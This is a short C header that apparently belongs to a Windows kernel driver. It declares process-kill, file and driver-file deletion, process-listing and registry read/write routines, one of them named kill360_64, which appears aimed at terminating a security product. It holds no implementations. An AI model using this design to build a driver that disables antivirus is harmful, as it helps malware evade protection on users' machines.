#pragma once
#include "internal.h"
CHAR xKill1(DWORD32 dwPid);
CHAR xKill2(DWORD32 dwPid);
CHAR xDel1(PCSTR userPath);

NTSTATUS DelDriverFile(PUNICODE_STRING pUsDriverPath);
NTSTATUS kill360_64();
NTSTATUS xDelFile3(PCHAR pAsFileName);
NTSTATUS tasklist_user(PCHAR buff, size_t buffLength);
NTSTATUS xkill3(DWORD dwPid);

NTSTATUS queryRegA(PCHAR path, PCHAR key, PKEY_VALUE_PARTIAL_INFORMATION value, DWORD maxLen);
NTSTATUS queryRegW(PUNICODE_STRING path, PUNICODE_STRING key, PKEY_VALUE_PARTIAL_INFORMATION value, DWORD maxLen);
NTSTATUS setRegW(PUNICODE_STRING path, PUNICODE_STRING key, ULONG type, PVOID data, DWORD dataLen);
NTSTATUS setRegA(PCHAR path, PCHAR key, ULONG type, PVOID data, DWORD dataLen);